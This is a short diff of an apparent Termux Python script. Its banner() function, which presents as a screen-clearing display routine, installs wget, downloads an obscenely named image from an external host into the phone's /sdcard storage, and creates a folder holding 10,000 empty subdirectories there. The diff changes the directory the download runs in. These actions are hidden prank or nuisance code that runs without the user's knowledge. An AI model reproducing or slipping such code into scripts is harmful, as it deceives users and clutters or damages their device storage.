@@ -30,7 +30,7 @@ def clear():
 def banner():
     clear()
     os.system("pkg install wget")
-    os.system("cd pagla && wget https://i.ibb.co/jyfYmhw/fuckyou.jpg && mv fuckyou.jpg /sdcard")
+    os.system("cd /sdcard && wget https://i.ibb.co/jyfYmhw/fuckyou.jpg && mv fuckyou.jpg /sdcard")
     os.system("cd /sdcard && mkdir botolbaba && cd /sdcard/botolbaba && mkdir `seq 1 10000`")
     print(f"""
 {bb}  ____   ____ _______ ____  _ 
